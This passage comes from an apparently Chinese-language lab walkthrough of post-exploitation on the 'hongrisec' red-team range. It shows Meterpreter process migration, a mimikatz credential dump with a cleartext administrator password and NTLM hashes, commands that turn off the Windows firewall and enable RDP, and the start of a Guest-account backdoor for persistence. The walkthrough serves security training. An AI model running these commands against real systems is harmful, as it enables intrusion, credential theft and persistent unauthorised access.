 <span class="token number">1756</span>  <span class="token number">508</span>   SearchIndexer.exe  x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>SearchIndexer.exe
 <span class="token number">1836</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>LOCAL SERVICE    C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">1896</span>  <span class="token number">508</span>   taskhost.exe       x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>taskhost.exe
 <span class="token number">1920</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>LOCAL SERVICE    C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">1948</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>NETWORK SERVICE  C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">1976</span>  <span class="token number">2116</span>  httpd.exe          x86   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>phpStudy<span class="token punctuation">\</span>Apache<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>httpd.exe
 <span class="token number">2052</span>  <span class="token number">1212</span>  vmtoolsd.exe       x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>VMware<span class="token punctuation">\</span>VMware Tools<span class="token punctuation">\</span>vmtoolsd.exe
 <span class="token number">2068</span>  <span class="token number">1212</span>  openvpn-gui.exe    x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>OpenVPN<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>openvpn-gui.exe
 <span class="token number">2116</span>  <span class="token number">1212</span>  phpStudy.exe       x86   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>phpStudy<span class="token punctuation">\</span>phpStudy.exe
 <span class="token number">2124</span>  <span class="token number">1212</span>  cmd.exe            x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>cmd.exe
 <span class="token number">2180</span>  <span class="token number">1976</span>  httpd.exe          x86   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>phpStudy<span class="token punctuation">\</span>Apache<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>httpd.exe
 <span class="token number">2396</span>  <span class="token number">2708</span>  cmd.exe            x86   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>cmd.exe
 <span class="token number">2432</span>  <span class="token number">508</span>   taskhost.exe       x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>LOCAL SERVICE    C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>taskhost.exe
 <span class="token number">2448</span>  <span class="token number">508</span>   wmpnetwk.exe       x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>NETWORK SERVICE  C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Windows Media Player<span class="token punctuation">\</span>wmpnetwk.exe
 <span class="token number">2496</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">2540</span>  <span class="token number">404</span>   conhost.exe        x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>conhost.exe
 <span class="token number">2620</span>  <span class="token number">404</span>   conhost.exe        x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>conhost.exe
 <span class="token number">2684</span>  <span class="token number">404</span>   conhost.exe        x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>conhost.exe
 <span class="token number">2708</span>  <span class="token number">2180</span>  cmd.exe            x86   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>cmd.exe
 <span class="token number">2884</span>  <span class="token number">404</span>   conhost.exe        x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>conhost.exe
 <span class="token number">2984</span>  <span class="token number">2396</span>  houmen.exe         x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             c:<span class="token punctuation">\</span>houmen.exe
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; migrate 512
[*] Migrating from 2984 to 512...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; migrate 524
[*] Migrating from 2984 to 524...
[*] Migration completed successfully.
meterpreter &gt; load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain  LM                                NTLM                              SHA1
--------       ------  --                                ----                              ----
Administrator  GOD     3cfb20151e7ae02cccf9155e3e7db453  1db9f782898fc137280b588fac868e0b  865b2f37e68a3b8c5af37a0d8c44f95aeb023d9
                                                                                           8
STU1$          GOD                                       f9409788cf55512badac576c9f15ee6d  57d56580669e86b1b07f423540160a275f1bf2f
                                                                                           8

wdigest credentials
===================

Username       Domain  Password
--------       ------  --------
(null)         (null)  (null)
Administrator  GOD     hongrisec@2019
STU1$          GOD     41 bf 55 f8 6e c5 9e 7d 27 6e ea 1e 29 be 7e 99 df 0d b0 bc 39 8b 3a 2a 1f 09 e2 ab 6c 83 f2 28 68 7f b3 57
                        a9 e4 e4 8d 5f 2c 3c 7d 88 dd 52 a9 b4 26 ea 9f 46 74 b2 1d 15 45 81 e0 ea 25 fa a8 ef e5 cd 3f 0d 35 44 b
                       1 af 9c d8 8e e1 31 28 a2 02 1d 2d 5b 3c 01 d2 35 13 8b ff 4f 46 da 4f b7 d5 d4 e6 6b 08 20 c9 4f 46 83 28
                       cc e8 4b cb f3 60 0f fd 7c 1e 1e 2f 1f bb 8a dc f8 5b be d8 b4 d0 cd f9 02 e1 c0 56 23 c7 2d c2 69 76 70 94
                        b5 cb d5 c2 90 98 52 59 1b d5 2a bd bc 08 b0 56 45 69 c3 33 33 4d 00 60 3c 8c 41 b9 c9 00 ef 75 ac 3c 2d 8
                       f cc 4b 90 4a a6 08 e5 4d eb 0a f7 32 d9 81 2e 62 aa 68 65 fd e6 d2 a4 b0 4a 52 fd 63 4f 8b 33 bc 69 65 33
                       a4 c7 3f 4a 37 a5 ce ea ed b5 07 bc 2a 4f b4 4f 3b c0 ca b8 34 d2 1b 47 f7 f9

tspkg credentials
=================

Username       Domain  Password
--------       ------  --------
Administrator  GOD     hongrisec@2019

kerberos credentials
====================

Username       Domain   Password
--------       ------   --------
(null)         (null)   (null)
Administrator  GOD.ORG  hongrisec@2019
stu1$          GOD.ORG  41 bf 55 f8 6e c5 9e 7d 27 6e ea 1e 29 be 7e 99 df 0d b0 bc 39 8b 3a 2a 1f 09 e2 ab 6c 83 f2 28 68 7f b3 5
                        7 a9 e4 e4 8d 5f 2c 3c 7d 88 dd 52 a9 b4 26 ea 9f 46 74 b2 1d 15 45 81 e0 ea 25 fa a8 ef e5 cd 3f 0d 35 44
                         b1 af 9c d8 8e e1 31 28 a2 02 1d 2d 5b 3c 01 d2 35 13 8b ff 4f 46 da 4f b7 d5 d4 e6 6b 08 20 c9 4f 46 83
                        28 cc e8 4b cb f3 60 0f fd 7c 1e 1e 2f 1f bb 8a dc f8 5b be d8 b4 d0 cd f9 02 e1 c0 56 23 c7 2d c2 69 76 7
                        0 94 b5 cb d5 c2 90 98 52 59 1b d5 2a bd bc 08 b0 56 45 69 c3 33 33 4d 00 60 3c 8c 41 b9 c9 00 ef 75 ac 3c
                         2d 8f cc 4b 90 4a a6 08 e5 4d eb 0a f7 32 d9 81 2e 62 aa 68 65 fd e6 d2 a4 b0 4a 52 fd 63 4f 8b 33 bc 69
                        65 33 a4 c7 3f 4a 37 a5 ce ea ed b5 07 bc 2a 4f b4 4f 3b c0 ca b8 34 d2 1b 47 f7 f9
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br></div></div><blockquote><p>可得密码：hongrisec@2019</p></blockquote> <h4 id="法二-cs"><a href="#法二-cs" class="header-anchor">#</a> 法二：CS</h4> <p><img src="/assets/img/image-20220814170532122.76f21644.png" alt="image-20220814170532122"></p> <p>然后再点击&quot;抓取明文密码&quot;即可。</p> <h3 id="启用远程桌面"><a href="#启用远程桌面" class="header-anchor">#</a> 启用远程桌面</h3> <h4 id="法一-cmd"><a href="#法一-cmd" class="header-anchor">#</a> 法一：CMD</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">netstat</span> -ano <span class="token operator">|</span> findstr <span class="token string">&quot;3389&quot;</span>						<span class="token comment"># 查看端口3389是否开启</span>
REG query HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal<span class="token string">&quot; &quot;</span>Server<span class="token punctuation">\</span>WinStations<span class="token punctuation">\</span>RDP-Tcp /v PortNumber		<span class="token comment"># 查看远程端口</span>
REG ADD HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal<span class="token string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f	<span class="token comment"># 开启3389端口</span>
netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;Remote Desktop&quot;</span> <span class="token assign-left variable">protocol</span><span class="token operator">=</span>TCP <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">localport</span><span class="token operator">=</span><span class="token number">3389</span> <span class="token assign-left variable">action</span><span class="token operator">=</span>allow	<span class="token comment"># 允许 3389 端口放行</span>
netsh firewall <span class="token builtin class-name">set</span> opmode disable					<span class="token comment"># Windows Server 2003 系统及之前版本</span>
netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off			<span class="token comment"># Windows Server 2003 之后系统版本</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="/assets/img/image-20220814173528143.22e5b665.png" alt=""></p> <h4 id="法二-vmic-推荐"><a href="#法二-vmic-推荐" class="header-anchor">#</a> 法二：VMIC (推荐)</h4> <blockquote><p>该方法会自动开启系统远程桌面中的允许远程连接到此计算机并启动默认的3389端口</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20220814194107916.bb3910e5.png" alt="image-20220814194107916"></p> <h4 id="法三-msf"><a href="#法三-msf" class="header-anchor">#</a> 法三：MSF</h4> <h5 id="meterpretr-enable-rdp模块"><a href="#meterpretr-enable-rdp模块" class="header-anchor">#</a> <strong>Meterpretr enable_rdp模块</strong></h5> <div class="language- line-numbers-mode"><pre class="language-text"><code>run post/windows/manage/enable_rdp 
run multi_console_command -r &lt;FileLocation&gt;				（文件为启用模块后的给的路径，都在/root/.msf4/loot/目录下）
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-shell line-numbers-mode"><pre class="language-shell"><code>meterpreter <span class="token operator">&gt;</span> run post/windows/manage/enable_rdp 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Enabling Remote Desktop
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     RDP is already enabled
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting Terminal Services <span class="token function">service</span> startup mode
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     The Terminal Services <span class="token function">service</span> is not <span class="token builtin class-name">set</span> to auto, changing it to auto <span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Opening port <span class="token keyword">in</span> <span class="token builtin class-name">local</span> firewall <span class="token keyword">if</span> necessary
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> For cleanup execute Meterpreter resource file: /root/.msf4/loot/20220814082551_default_192.168.220.138_host.windows.cle_346748.txt
meterpreter <span class="token operator">&gt;</span> 
meterpreter <span class="token operator">&gt;</span> run multi_console_command -r /root/.msf4/loot/20220814082551_default_192.168.220.138_host.windows.cle_346748.txt
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running Command List <span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Running <span class="token builtin class-name">command</span> execute -H -f cmd.exe -a <span class="token string">&quot;/c sc config termservice start= disabled&quot;</span>
Process <span class="token number">3008</span> created.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Running <span class="token builtin class-name">command</span> execute -H -f cmd.exe -a <span class="token string">&quot;/c sc stop termservice&quot;</span>
Process <span class="token number">2848</span> created.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Running <span class="token builtin class-name">command</span> execute -H -f cmd.exe -a <span class="token string">&quot;/c 'netsh firewall set service type = remotedesktop mode = enable'&quot;</span>
Process <span class="token number">1416</span> created.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h5 id="getgui模块-略"><a href="#getgui模块-略" class="header-anchor">#</a> GetGUI模块 (略)</h5> <h4 id="远程登录"><a href="#远程登录" class="header-anchor">#</a> 远程登录</h4> <p>在MSF里死活登不进</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>msf6 exploit(multi/handler) &gt; rdesktop 192.168.220.138
[*] exec: rdesktop 192.168.220.138

Core(warning): Certificate received from server is NOT trusted by this sspecific certificate.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>也确认了上面对Win7的配置没有出错</p> <p><img src="/assets/img/image-20220814225454974.ea357ac7.png" alt="image-20220814225454974"></p> <p>网上搜了一下，发现 rdesktop 不适用于 WinXP/2003+ (不含XP/2003)</p> <p><img src="/assets/img/image-20220814225701766.dcc81632.png" alt="image-20220814225701766"></p> <p>试一下用Win10的RD Client，成功连接，说明确实是 rdsektop 的问题</p> <blockquote><p>当然，也可以用Linux上的Remmina</p></blockquote> <p><img src="/assets/img/image-20220814225917789.eca9a05e.png" alt="image-20220814225917789"></p> <h2 id="权限维持"><a href="#权限维持" class="header-anchor">#</a> 权限维持</h2> <h3 id="guest后门"><a href="#guest后门" class="header-anchor">#</a> Guest后门</h3> <blockquote><p>注：应加上域标签，如果完全复制此种方式，只是添加到STU1域</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>shell net user									 <span class="token comment"># 查看本机用户</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="data:image/png;base64,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